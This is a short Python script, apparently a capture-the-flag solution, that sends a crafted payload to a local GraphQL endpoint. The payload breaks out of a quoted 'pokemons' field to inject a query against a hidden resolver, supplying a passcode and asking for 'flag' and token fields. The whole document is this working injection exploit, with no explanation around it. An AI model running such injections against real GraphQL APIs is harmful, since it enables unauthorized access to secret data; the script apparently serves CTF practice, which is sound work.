import requests

payload = '") { id } test:digimOwOUwURawrn38408375018458385023841203489738570123(passcode:"dish-percent-drop-brief", name:"Flagmon") { id name level type attribute description flag tokenf0e4c2f76c58916ec258f246851bea091d14d4247a2fc3e18694461b1816e13b tokend743cb4b22397cf64e0117fd83d29ca1e059c698b8155a3771417e24458e2bb5 tokenb20e3fc8e392aeae90db75a40648ad4aa87d13830ef9eb80343b960130ec2d3e } _2:pokemon(name:"'
url = "http://localhost:24049/api/query"

r = requests.post(url, json={
    "pokemons": [ payload ],
    "compares": [ "id" ]
})

print(r.json())
